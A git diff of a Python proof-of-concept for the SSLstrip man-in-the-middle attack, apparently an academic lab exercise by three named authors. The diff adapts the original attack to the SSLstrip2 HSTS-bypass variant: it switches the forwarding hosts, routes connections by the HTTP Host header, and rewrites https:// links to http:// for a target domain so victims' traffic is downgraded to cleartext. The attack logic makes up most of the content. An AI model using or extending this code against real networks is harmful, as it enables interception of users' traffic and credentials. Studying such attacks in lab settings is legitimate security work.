@@ -2,8 +2,7 @@
 # -*- coding: utf-8
 
 """
-This script is a Poc of the SSLstrip attack presented by Moxie at the BlackHat
-conference, in 2008.
+This script is a Poc of the SSLstrip2 attack presented by LeonardoNve.
 """
 
 __author__  = 'Amélie Risi, Brendan Guevel and Simon Duret'
@@ -14,8 +13,8 @@ __status__  = 'Development'
 
 import select, socket, ssl, sys, re
 
-HTTPS_URL           = [b'/secure.html']
-FORWARD_HOST        = '147.210.12.1'
+FORWARD_HOST_HSTS   = 'www.opeth.secure'
+FORWARD_HOST        = "www.opeth.local"
 FORWARD_CERT        = "/mnt/host/cert.pem"
 FORWARD_HTTP_PORT   = 80
 FORWARD_HTTPS_PORT  = 443
@@ -43,7 +42,7 @@ class SSLstrip:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ssl_ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
         ssl_ctx.load_verify_locations(FORWARD_CERT)
-        sock = ssl_ctx.wrap_socket(sock, server_hostname=FORWARD_HOST)
+        sock = ssl_ctx.wrap_socket(sock, server_hostname=FORWARD_HOST_HSTS)
         sock.connect((FORWARD_HOST, FORWARD_HTTPS_PORT))
         self.__csockets[csock] = sock
         self.__csockets[sock] = csock
@@ -55,7 +54,8 @@ class SSLstrip:
         self.__csockets[sock] = csock
 
     def __replace_https_to_http(self, data):
-        return re.sub(b'https://', b'http://', data)
+        return re.sub(b'https://' + bytes(FORWARD_HOST_HSTS),
+                      b'http://' + bytes(FORWARD_HOST_HSTS), data)
 
     def __replace_content_length(self, data):
         try:
@@ -76,8 +76,8 @@ class SSLstrip:
             print(data)
 
             if fw_sock is None:
-                m = re.search(b'(GET|POST) (\S+) HTTP/\d.\d', data)
-                if m is not None and m.group(2) in HTTPS_URL:
+                m = re.search(b'Host: (\S+)', data)
+                if m is not None and m.group(1) == FORWARD_HOST_HSTS:
                     self.__new_https_conn(csock)
                 else:
                     self.__new_http_conn(csock)
